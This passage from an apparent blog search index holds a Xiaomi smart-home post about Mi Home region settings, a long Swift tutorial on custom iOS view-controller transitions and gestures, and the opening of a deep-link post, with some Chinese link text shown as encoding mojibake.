ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Mi Home APP / Xiao Ai Speaker Region IssuesNew Purchase of Xiaomi Air Purifier...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Mi Home APP / Xiao Ai Speaker Region IssuesNew Purchase of Xiaomi Air Purifier 3 &amp; Recording Issues with Mijia and Xiao Ai Speaker IntegrationIntroductionRegarding Xiaomi‚Äôs fourth product; recently added a new member ‚Äî ‚ÄúXiaomi Air Purifier 3‚ÄùHonestly, I never paid attention to the air quality in my room. I often felt uneasy when the outdoor air was hazy. Plus, I have chronic nasal allergies, so I decided to buy one for my room!The new generation features a small screen on the main unit that shows the remaining filter life, current air quality, and allows mode selection, all without needing to connect to an app. Connecting to the app enables remote control but offers no additional special functions.It‚Äôs been two weeks since I bought it, and I‚Äôve found the room‚Äôs air quality to be quite good. When outdoor air is good, the indoor air quality values are around 001~006; when outdoor air is bad, indoor values are about 008~015. Values above 75 indicate poor air quality, and above 150 is considered severe. I probably should have bought a vacuum cleaner instead XD.But having a small air quality monitor guarding the home is still pretty nice.Mijia Smart Home Regional Feature RestrictionsThe Mi Home app offers two region options: Taiwan and China. The region you choose affects the app‚Äôs features. Initially, I selected China, thinking that since data security is questionable in any region, I might as well choose the one with more features to enjoy more functions.After adding the Xiao Ai speaker last year, I noticed a more complex issue with region selection: to control Mi Jia smart appliances via the Xiao Ai speaker, both apps must have the same region selected, or they won‚Äôt connect. This is frustrating because if the Xiao Ai speaker is set to Taiwan, it can work with KKBOX, but the smart features are limited (missing Xiao Ai training).Therefore, my Xiao Ai speaker was originally set to the China region. When adding previously purchased appliances, I didn‚Äôt encounter any issues. In the end, I successfully created a complete smart home routine: when leaving, saying goodbye to Xiao Ai will automatically turn off all appliances and activate the door camera; when arriving home, saying ‚ÄúI‚Äôm home‚Äù will automatically turn on the appliances. The experience is quite smooth!Left: Taiwan / Right: ChinaAddition of Xiaomi Air Purifier 3Bought so many Xiaomi home products, of course the new member must join my Mi Home APP!However, I encountered a problem when adding it. The Taiwan version of the Xiaomi Air Purifier 3 cannot be added to my Mi Home APP unless the Mi Home APP region is switched back to Taiwan‚Ä¶.This is troublesome. The air purifier cannot be added; no matter how I try, it won‚Äôt work. It seems the pairing methods differ between Taiwan and China. Reluctantly, I had to switch the region back to Taiwan and reset all appliances‚Ä¶ The Xiao Ai speaker was also switched back to Taiwan.Xiao Ai Speaker + Mijia Smart Home Scene ControlAfter switching the region back to Taiwan, the ‚ÄúXiao Ai Training‚Äù feature disappeared; you can no longer set vocabulary to trigger corresponding Mi Home smart home scenes directly within the app. However, after multiple attempts, I found that if the smart home is linked and authorized with the Mi Home app, the scenes and appliances will still automatically sync to the Xiao Ai speaker for authorized control!BUGMy scene ‚ÄúGoing Home‚Äù can be correctly recognized and executed by the Xiao Ai speaker, but ‚ÄúGoing Out‚Äù cannot be recognized at all. After trying for an entire afternoon, I found out it was a Simplified-Traditional Chinese issue; when I changed the scene name to ‚ÄúÂá∫Èó®‚Äù (Simplified), the Xiao Ai speaker could recognize and execute it properly. For those who encounter issues with scenarios not executing, try changing the scenario name and device name to Simplified Chinese. Done! Now you can set the app region to Taiwan and continue using Miga Smart Home as usual.Further Reading Smart Home First Experience ‚Äî Apple HomeKit &amp; Xiaomi Mijia (Mijia Smart Camera and Mijia Smart Desk Lamp, HomeKit Setup Tutorial) Xiaomi Smart Home New Purchases (AI Speaker, Temperature and Humidity Sensor, Scale 2, DC Inverter Fan) iOS ‚â• 13.1 Automation with ‚ÄúShortcuts‚Äù and Mijia Smart Home (Using the built-in Shortcuts app in iOS ‚â• 13.1 to complete automation) [Advanced] Demonstration of Using Raspberry Pi as a HomeBridge Host to Connect All Mijia Appliances to HomeKit If you have any questions or feedback, feel free to contact me . üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS UIViewController TransitionsÔΩúMaster Pull-Down Close, Pull-Up Present & Full-Page Swipe Back", "url": "/posts/zrealm-dev/ios-uiviewcontroller-transitions-master-pull-down-close-pull-up-present-full-page-swipe-back-14cee137c565/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, swift, uiviewcontroller, mobile-app-development", "date": "2020-01-12 02:41:06 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS UIViewController Transition EssentialsComplete Guide to Pull Down to Close...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS UIViewController Transition EssentialsComplete Guide to Pull Down to Close / Pull Up to Show / Full-Page Right Swipe Back Effects in UIViewControllerPrefaceI have always been curious about how popular apps like Facebook, Line, Spotify, etc., implement effects such as ‚Äúpull down to dismiss a presented UIViewController,‚Äù ‚Äúslide up to fade in a UIViewController,‚Äù and ‚Äúfull-screen swipe right to go back.‚ÄùBecause these effects are not built-in, the pull-down-to-close feature is only supported with the system card style starting from iOS ‚â• 13.The Path of ExplorationNot sure if it‚Äôs due to poor keyword choices or the scarcity of data, but I can‚Äôt find practical implementations of this feature. The information I found is vague and scattered, forcing me to piece it together from various sources.At first, when researching on my own, I found the UIPresentationController API. Without digging deeper, I used this method combined with UIPanGestureRecognizer in a crude way to achieve the pull-down-to-close effect; I always felt something was off and thought there must be a better way.Until recently, when working on a new project, I read this great article and broadened my perspective, discovering other APIs that offer more elegant and flexible approaches. This article serves as both a personal record and a guide for friends who share the same confusion. The content is a bit long. If it‚Äôs too much trouble, you can scroll down to see the example or directly download the Github project to study!iOS 13 Card Style Presentation PageFirst, let‚Äôs talk about the latest system built-in effectsFor iOS ‚â• 13, UIViewController.present(_:animated:completion:)The default modalPresentationStyle is UIModalPresentationAutomatic, which presents the page in a card style. To keep the previous full-screen presentation, you need to explicitly set it back to UIModalPresentationFullScreen.Built-in Calendar Add Event EffectHow to Disable Pull-Down to Close? Close Confirmation?A better user experience should check for any entered data when triggering the dropdown to close. If there is data, the user should be prompted whether to discard changes and leave.Apple has already thought this through for us; we just need to implement the methods in UIAdaptivePresentationControllerDelegate.import UIKitclass DetailViewController: UIViewController { private var onEdit:Bool = true; override func viewDidLoad() { super.viewDidLoad() // Set delegate self.presentationController?.delegate = self // if UIViewController is embedded in navigationController: // self.navigationController?.presentationController?.delegate = self // Disable swipe down to dismiss (1): self.isModalInPresentation = true; } }// Delegate implementationextension DetailViewController: UIAdaptivePresentationControllerDelegate { // Disable swipe down to dismiss (2): func presentationControllerShouldDismiss(_ presentationController: UIPresentationController) -&gt; Bool { return false; } // Swipe down gesture triggered when dismissal is cancelled func presentationControllerDidAttemptToDismiss(_ presentationController: UIPresentationController) { if (onEdit) { let alert = UIAlertController(title: \"Data not saved\", message: nil, preferredStyle: .actionSheet) alert.addAction(UIAlertAction(title: \"Discard and leave\", style: .default) { _ in self.dismiss(animated: true) }) alert.addAction(UIAlertAction(title: \"Continue editing\", style: .cancel, handler: nil)) self.present(alert, animated: true) } else { self.dismiss(animated: true, completion: nil) } }}To disable pull-down dismissal, you can either set the UIViewController variable isModalInPresentation to false or implement the UIAdaptivePresentationControllerDelegate method presentationControllerShouldDismiss and return true. Either approach works.UIAdaptivePresentationControllerDelegate presentationControllerDidAttemptToDismiss method is only called when the pull-down dismissal is canceled.By the way‚Ä¶The card-style display page is called a Sheet in the system, and its behavior differs from FullScreen. Assuming today RootViewController is HomeViewController In card style presentation (UIModalPresentationAutomatic): When presenting DetailViewController from HomeViewController‚Ä¶ viewWillDisappear / viewDidDisappear of HomeViewController are not triggered. When DetailViewController is Dismissed‚Ä¶ HomeViewController does not trigger viewWillAppear / viewDidAppear. ‚ö†Ô∏è Since XCODE 11, iOS ‚â• 13 apps packaged by default use card style for Present (UIModalPresentationAutomatic) If you have placed some logic in viewWillAppear/viewWillDisappear/viewDidAppear/viewDidDisappear before, be extra careful and check thoroughly! ‚ö†Ô∏è After reviewing the system built-ins, let‚Äôs move on to the main highlight of this article! How to create these effects yourself?Where can transition animations be made?First, identify where window switching transition animations can be implemented.UITabBarController/UIViewController/UINavigationControllerWhen Switching UITabBarControllerWe can set the delegate in UITabBarController and implement the animationControllerForTransitionFrom method to apply custom transition effects when switching UITabBarController content.The system defaults to no animation; the image above shows a fade-in fade-out transition effect.import UIKitclass MainTabBarViewController: UITabBarController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self } }extension MainTabBarViewController: UITabBarControllerDelegate { func tabBarController(_ tabBarController: UITabBarController, animationControllerForTransitionFrom fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //return UIViewControllerAnimatedTransitioning }}When Presenting/Dismissing UIViewControllerNaturally, when Present/Dismiss a UIViewController, you can specify the animation effect; otherwise, this article wouldn‚Äôt exist XD. However, it‚Äôs worth mentioning that if you only need a Present animation without gesture control, you can directly use UIPresentationController for convenience and speed (see references at the end).The system default is slide up to appear and slide down to disappear! For customizations, you can add fade-in, rounded corners, position control, and other effects.import UIKitclass HomeAddViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() self.modalPresentationStyle = .custom self.transitioningDelegate = self } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { // Returning nil uses the default animation return // UIViewControllerAnimatedTransitioning animation to apply when presenting } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { // Returning nil uses the default animation return // UIViewControllerAnimatedTransitioning animation to apply when dismissing }} Any UIViewController can implement transitioningDelegate to specify Present/Dismiss animations; this applies to UITabBarViewController, UINavigationController, UITableViewController, and more.When UINavigationController Pushes/PopsUINavigationController is probably the least likely to need animation changes because the system‚Äôs default slide-in from the left and slide-back from the right animation is already the best effect. Customizing this part might be useful for creating seamless left-right switching between UIViewControllers.Because we want to enable full-page swipe back gestures and use a custom POP animation, we need to implement our own back animation effect.import UIKitclass HomeNavigationController: UINavigationController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self }}extension HomeNavigationController: UINavigationControllerDelegate { func navigationController(_ navigationController: UINavigationController, animationControllerFor operation: UINavigationController.Operation, from fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { if operation == .pop { return // UIViewControllerAnimatedTransitioning animation to apply when popping } else if operation == .push { return // UIViewControllerAnimatedTransitioning animation to apply when pushing } // Return nil to use the default animation return nil }}Interactive or Non-Interactive Animation?Before discussing animation implementation and gesture control, let‚Äôs first explain what interactive and non-interactive mean.Interactive Animation: Gesture-triggered animations, such as UIPanGestureRecognizerNon-interactive Animation: System-triggered animations, such as self.present()How to Implement Animation Effects?After discussing where it can be done, let‚Äôs look at how to create animation effects.We need to implement the UIViewControllerAnimatedTransitioning protocol and perform animations on the window within it.Common Transition Animation: UIView.animateUsing UIView.animate directly for animation requires the UIViewControllerAnimatedTransitioning to implement two methods: transitionDuration to specify the animation duration, and animateTransition to define the animation content.import UIKitclass SlideFromLeftToRightTransition: NSObject, UIViewControllerAnimatedTransitioning { func transitionDuration(using transitionContext: UIViewControllerContextTransitioning?) -&gt; TimeInterval { return 0.4 } func animateTransition(using transitionContext: UIViewControllerContextTransitioning) { // Available parameters: // Get the view of the target UIViewController to be displayed: let toView = transitionContext.view(forKey: .to) // Get the target UIViewController to be displayed: let toViewController = transitionContext.viewController(forKey: .to) // Get the initial frame info of the target UIViewController's view: let toInitalFrame = transitionContext.initialFrame(for: toViewController!) // Get the final frame info of the target UIViewController's view: let toFinalFrame = transitionContext.finalFrame(for: toViewController!) // Get the current UIViewController's view: let fromView = transitionContext.view(forKey: .from) // Get the current UIViewController: let fromViewController = transitionContext.viewController(forKey: .from) // Get the initial frame info of the current UIViewController's view: let fromInitalFrame = transitionContext.initialFrame(for: fromViewController!) // Get the final frame info of the current UIViewController's view: (Can get the final frame from the previous display animation when closing) let fromFinalFrame = transitionContext.finalFrame(for: fromViewController!) //toView.frame.origin.y = UIScreen.main.bounds.size.height UIView.animate(withDuration: transitionDuration(using: transitionContext), delay: 0, options: [.curveLinear], animations: { //toView.frame.origin.y = 0 }) { (_) in if (!transitionContext.transitionWasCancelled) { // Animation was not cancelled } // Notify the system that the animation is complete transitionContext.completeTransition(!transitionContext.transitionWasCancelled) } } } To and From: Assuming today HomeViewController needs to Present/Push DetailViewController, From = HomeViewController / To = DetailViewController When DetailViewController needs to Dismiss/Pop, From = DetailViewController / To = HomeViewController‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è It is officially recommended to get the View from transitionContext.view instead of using .view from transitionContext.viewController. But here is an issue: when performing Present/Dismiss animations with modalPresentationStyle = .custom; Using transitionContext.view(forKey: .from) in Present will be nil, Using transitionContext.view(forKey: .to) during Dismiss will also be nil ; Still need to get values from viewController.view to use.‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è transitionContext.completeTransition(!transitionContext.transitionWasCancelled) Must be called when the animation finishes, otherwise the screen will freeze ; However, since UIView.animate will not call completion if there is no animation to perform, the aforementioned method may not be called; therefore, make sure the animation will actually run (e.g., y from 100 to 0).‚ÑπÔ∏è‚ÑπÔ∏è‚ÑπÔ∏è‚ÑπÔ∏è‚ÑπÔ∏è For animations involving ToView/FromView, if the views are complex or cause issues during animation, you can use snapshotView(afterScreenUpdates:) to capture a snapshot for the animation. First, take a snapshot and add it to the layer with transitionContext.containerView.addSubview(snapShotView). Then hide the original ToView/FromView (isHidden = true). At the end of the animation, remove the snapShotView with snapShotView.removeFromSuperview() and restore the original ToView/FromView visibility (isHidden = false).Interruptible and Resumable Transition Animations: UIViewPropertyAnimatorYou can also use the new animation classes introduced in iOS ‚â• 10 to implement animation effects.Choose based on personal preference or the level of detail needed for the animation.Although the official recommendation is to use UIViewPropertyAnimator for interactive animations, for both interactive and non-interactive (gesture-controlled) animations, using UIView.animate is generally sufficient.UIViewPropertyAnimator supports pausing and continuing transition animations. While I‚Äôm not sure about its practical applications, interested readers can refer to this article.import UIKitclass FadeInFadeOutTransition: NSObject, UIViewControllerAnimatedTransitioning { private var animatorForCurrentTransition: UIViewImplicitlyAnimating? func interruptibleAnimator(using transitionContext: UIViewControllerContextTransitioning) -&gt; UIViewImplicitlyAnimating { // Return the current animator if there is an ongoing transition if let animatorForCurrentTransition = animatorForCurrentTransition { return animatorForCurrentTransition } // Parameters as mentioned before //fromView.frame.origin.y = 100 let animator = UIViewPropertyAnimator(duration: transitionDuration(using: transitionContext), curve: .linear) animator.addAnimations { //fromView.frame.origin.y = 0 } animator.addCompletion { (position) in transitionContext.completeTransition(!transitionContext.transitionWasCancelled) } // Keep a reference to the animator self.animatorForCurrentTransition = animator return animator } func transitionDuration(using transitionContext: UIViewControllerContextTransitioning?) -&gt; TimeInterval { return 0.4 } func animateTransition(using transitionContext: UIViewControllerContextTransitioning) { // For non-interactive transitions, use the interruptible animator as well let animator = self.interruptibleAnimator(using: transitionContext) animator.startAnimation() } func animationEnded(_ transitionCompleted: Bool) { // Clear the animator when animation ends self.animatorForCurrentTransition = nil } } In interactive scenarios (control details will be explained later), animations use the interruptibleAnimator method; for non-interactive cases, the animateTransition method is still used. Because of its resumable and interruptible nature, interruptibleAnimator can be called repeatedly; therefore, we need to use a global variable to store and access its return value.Murmur‚Ä¶Actually, I originally wanted to switch everything to the new UIViewPropertyAnimator and recommend everyone use it, but I encountered a strange issue. When doing a full-page swipe back pop animation, if the gesture is released and the animation resets, the Navigation Bar‚Äôs items at the top flicker with a fade in and out‚Ä¶ I couldn‚Äôt find a solution. However, this issue doesn‚Äôt occur when using UIView.animate. If I missed something, please let me know &lt;( _ _ )&gt;.Problem image; + button is for the previous pageSo to be safe, let‚Äôs stick with the old method!Separate classes will be created for different animation effects. If the files feel cluttered, you can refer to the packaged solution at the end of the article; or group the same continuous (Present + Dismiss) animations together.transitionCoordinatorIf you need finer control, such as changing a specific component in the ViewController to match the transition animation, you can use transitionCoordinator within UIViewController to coordinate. I haven‚Äôt used this part myself; if interested, you can refer to this article.How to Control Animation?This is the ‚Äúinteraction‚Äù mentioned earlier, which is essentially gesture control; this is the most important section of the article because we need to link gesture operations with transition animations to achieve the pull-down close and full-page back functions.Control Proxy Settings:As with the previous ViewController delegate animation design, the class handling interaction also needs to inform the ViewController through the delegate.UITabBarController: NoneUINavigationController (Push/Pop):import UIKitclass HomeNavigationController: UINavigationController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self }}extension HomeNavigationController: UINavigationControllerDelegate { func navigationController(_ navigationController: UINavigationController, animationControllerFor operation: UINavigationController.Operation, from fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { if operation == .pop { return // UIViewControllerAnimatedTransitioning animation to apply when popping } else if operation == .push { return // UIViewControllerAnimatedTransitioning animation to apply when pushing } // Return nil to use the default animation return nil } // Add interactive delegate method: func navigationController(_ navigationController: UINavigationController, interactionControllerFor animationController: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { // Here we cannot tell if it's Pop or Push, so we judge by the animation itself if animationController is push animation { return // UIPercentDrivenInteractiveTransition interactive control for push animation } else if animationController is pop animation { return // UIPercentDrivenInteractiveTransition interactive control for pop animation } // Return nil to disable interactive handling return nil }}UIViewController (Present/Dismiss):import UIKitclass HomeAddViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() self.modalPresentationStyle = .custom self.transitioningDelegate = self } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func interactionControllerForDismissal(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { // return nil means no interactive handling return // UIPercentDrivenInteractiveTransition interactive control method for Dismiss } func interactionControllerForPresentation(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { // return nil means no interactive handling return // UIPercentDrivenInteractiveTransition interactive control method for Present } func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { // returning nil uses the default animation return // UIViewControllerAnimatedTransitioning animation to apply during Present } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { // returning nil uses the default animation return // UIViewControllerAnimatedTransitioning animation to apply during Dismiss } }‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è If you implement methods like interactionControllerFor‚Ä¶, these methods will be called even if the animation is non-interactive (e.g., self.present system-triggered transition); what we need to control is the wantsInteractiveStart parameter inside (explained below).Animation Interaction Handler Class UIPercentDrivenInteractiveTransition:Next, let‚Äôs discuss the core implementation of UIPercentDrivenInteractiveTransition.import UIKitclass PullToDismissInteractive: UIPercentDrivenInteractiveTransition { // The UIView to add gesture control for interaction private var interactiveView: UIView! // The current UIViewController private var presented: UIViewController! // The threshold percentage to complete the transition, otherwise revert private let thredhold: CGFloat = 0.4 // Different transition effects may need different info, customizable convenience init(_ presented: UIViewController, _ interactiveView: UIView) { self.init() self.interactiveView = interactiveView self.presented = presented setupPanGesture() // Default value, informs the system that this is not an interactive animation initially wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 panGesture.delegate = self interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: // Reset gesture position sender.setTranslation(.zero, in: interactiveView) // Inform the system that an interactive animation triggered by gesture is starting wantsInteractiveStart = true // When gesture begins, call the transition effect (won't execute immediately, system will catch it) // Then if the transition has a corresponding animation, it will jump to UIViewControllerAnimatedTransitioning to handle // animated must be true, otherwise no animation // Dismiss: self.presented.dismiss(animated: true, completion: nil) // Present: //self.present(presenting,animated: true) // Push: //self.navigationController.push(presenting) // Pop: //self.navigationController.pop(animated: true) case .changed: // Calculate the gesture sliding position corresponding to animation completion percentage 0~1 // Actual calculation varies by animation type let translation = sender.translation(in: interactiveView) guard translation.y &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.y / interactiveView.bounds.height) // Update UIViewControllerAnimatedTransitioning animation percentage update(percentage) case .ended: // When gesture ends, check if completion exceeds threshold wantsInteractiveStart = false if percentComplete &gt;= thredhold { // Yes, inform animation to finish finish() } else { // No, inform animation to revert cancel() } case .cancelled, .failed: // On cancel or failure wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}// When UIViewController contains UIScrollView components (UITableView/UICollectionView/WKWebView...), prevent gesture conflicts// Enable interactive transition gesture only when the internal UIScrollView is scrolled to the topextension PullToDismissInteractive: UIGestureRecognizerDelegate { func gestureRecognizer(_ gestureRecognizer: UIGestureRecognizer, shouldRecognizeSimultaneouslyWith otherGestureRecognizer: UIGestureRecognizer) -&gt; Bool { if let scrollView = otherGestureRecognizer.view as? UIScrollView { if scrollView.contentOffset.y &lt;= 0 { return true } else { return false } } return true } }*Additional point about why sender.setTranslation(.zero, in: interactiveView) is needed&lt;We need to implement different classes based on the effects of various gesture operations; if the operations are part of the same sequence (Present + Dismiss), they can be grouped together.‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è wantsInteractiveStart must be in the correct state; setting wantsInteractiveStart = false during interactive animations can also cause screen freezes; You need to exit and reopen the app to restore normal function.‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è interactiveView must also have isUserInteractionEnabled = true You can add more settings to ensure it!CombinationAfter setting up the Delegate here and creating the Class, we can achieve the desired functionality.Next, without further ado, here is the complete example.Custom Dropdown Close Page EffectThe advantage of a custom pull-down is that it supports all iOS versions on the market, allows control over the overlay percentage, controls the trigger close position, and customizes animation effects.Click the + Present button at the top right corner of the pageThis is an example of HomeViewController presenting HomeAddViewController and HomeAddViewController dismissing itself.import UIKitclass HomeViewController: UIViewController { @IBAction func addButtonTapped(_ sender: Any) { guard let homeAddViewController = UIStoryboard(name: \"Main\", bundle: nil).instantiateViewController(identifier: \"HomeAddViewController\") as? HomeAddViewController else { return } //transitioningDelegate can be assigned to the target ViewController or the current ViewController homeAddViewController.transitioningDelegate = homeAddViewController homeAddViewController.modalPresentationStyle = .custom self.present(homeAddViewController, animated: true, completion: nil) }}import UIKitclass HomeAddViewController: UIViewController { private var pullToDismissInteractive:PullToDismissInteractive! override func viewDidLoad() { super.viewDidLoad() //Bind transition interaction info self.pullToDismissInteractive = PullToDismissInteractive(self, self.view) } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func interactionControllerForDismissal(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { return pullToDismissInteractive } func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { return PresentAndDismissTransition(false) } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { return PresentAndDismissTransition(true) } func interactionControllerForPresentation(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //No present gesture here return nil }}import UIKitclass PullToDismissInteractive: UIPercentDrivenInteractiveTransition { private var interactiveView: UIView! private var presented: UIViewController! private var completion:(() -&gt; Void)? private let thredhold: CGFloat = 0.4 convenience init(_ presented: UIViewController, _ interactiveView: UIView,_ completion:(() -&gt; Void)? = nil) { self.init() self.interactiveView = interactiveView self.completion = completion self.presented = presented setupPanGesture() wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 panGesture.delegate = self interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: sender.setTranslation(.zero, in: interactiveView) wantsInteractiveStart = true self.presented.dismiss(animated: true, completion: self.completion) case .changed: let translation = sender.translation(in: interactiveView) guard translation.y &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.y / interactiveView.bounds.height) update(percentage) case .ended: if percentComplete &gt;= thredhold { finish() } else { wantsInteractiveStart = false cancel() } case .cancelled, .failed: wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}extension PullToDismissInteractive: UIGestureRecognizerDelegate { func gestureRecognizer(_ gestureRecognizer: UIGestureRecognizer, shouldRecognizeSimultaneouslyWith otherGestureRecognizer: UIGestureRecognizer) -&gt; Bool { if let scrollView = otherGestureRecognizer.view as? UIScrollView { if scrollView.contentOffset.y &lt;= 0 { return true } else { return false } } return true } }The above achieves the effect shown in the image. Since this is a tutorial demonstration, I didn‚Äôt want to make the path too complicated, so the code is messy and has plenty of room for optimization and integration. It is worth mentioning‚Ä¶ iOS ‚â• 13, if a View contains a UITextView, during the pull-down close animation, the text inside the UITextView will appear blank; this causes a flickering experience (video example) ‚Ä¶ The solution here is to use snapshotView(afterScreenUpdates:) to capture a snapshot instead of the original view layer during animation.Full-page right swipe to go backWhen looking for a solution to enable full-screen right-swipe back gesture, I found a tricky method:Add a UIPanGestureRecognizer directly to the view, then set both the target and action to the native interactivePopGestureRecognizer with action:handleNavigationTransition.*Click here for detailed method&lt;That‚Äôs right! It definitely looks like a Private API, so it might be rejected during review; also, it‚Äôs uncertain if Swift can use it, as it likely relies on Objective-C runtime features.Let‚Äôs stick to the official way:Using the same approach as in this article, we handle the navigationController POP ourselves; just add a full-page right swipe gesture controller combined with a custom right swipe animation!Other parts omitted, only key animation and interaction handling classes are shown:import UIKitclass SwipeBackInteractive: UIPercentDrivenInteractiveTransition { private var interactiveView: UIView! private var navigationController: UINavigationController! private let thredhold: CGFloat = 0.4 convenience init(_ navigationController: UINavigationController, _ interactiveView: UIView) { self.init() self.interactiveView = interactiveView self.navigationController = navigationController setupPanGesture() wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: sender.setTranslation(.zero, in: interactiveView) wantsInteractiveStart = true self.navigationController.popViewController(animated: true) case .changed: let translation = sender.translation(in: interactiveView) guard translation.x &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.x / interactiveView.bounds.width) update(percentage) case .ended: if percentComplete &gt;= thredhold { finish() } else { wantsInteractiveStart = false cancel() } case .cancelled, .failed: wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}Pull-up Fade-in UIViewControllerPulling up on the view to fade in + pulling down to close creates a transition effect similar to Spotify‚Äôs player!This part is more complicated, but the principle is the same. It will not be posted here. Interested readers can refer to the GitHub example.The main point to note is when pulling up for fade-in, the animation must use ‚Äú.curveLinear linear‚Äù; otherwise, the pull-up will feel unresponsive. The pulling distance and the display position will not be proportional.Done!Completed Diagram This article is very long and took me a lot of time to organize and create. Thank you for your patience in reading.Download the full GitHub examples:Reference: Draggable view controller? Interactive view controller! Systematic Learning of iOS Animations Part 4: View Controller Transition Animations Systematic Learning of iOS Animations Part 5: Using UIViewPropertyAnimator Use UIPresentationController to create a simple and elegant bottom popup control (If you only want the Present animation effect, you can use this directly) For reference to elegant code encapsulation usage: Swift: https://github.com/Kharauzov/SwipeableCards Objective-C: https://github.com/saiday/DraggableViewControllerDemo If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Deferred Deep Link ImplementationÔΩúSwift Guide to Seamless App Navigation", "url": "/posts/zrealm-dev/ios-deferred-deep-link-implementation-swift-guide-to-seamless-app-navigation-b08ef940c196/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, deeplink, ios-app-development, swift, universal-links, app-store", "date": "2019-11-11 22:34:57 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Deferred Deep Link Implementation (Swift)Create a Seamless App 